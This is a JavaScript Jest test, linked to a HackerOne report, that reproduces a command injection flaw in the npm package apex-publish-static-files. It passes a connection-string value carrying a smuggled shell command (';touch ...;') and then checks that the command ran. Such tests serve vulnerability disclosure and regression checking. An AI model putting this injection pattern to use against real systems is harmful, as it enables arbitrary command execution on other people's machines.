//https://hackerone.com/reports/405694
test("Command Injection in apex-publish-static-files", () => {
  expect.assertions(2);
  const publisher = require("apex-publish-static-files");
  const fs = require("fs");
  const path = "./apex-publish-static-files";
  const sleep = require("sleep");
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    publisher.publish({
      connectString: ";touch apex-publish-static-files;",
      directory: "./",
      appID: 111,
    });
  } catch (err) {
  } finally {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {});
  }
});
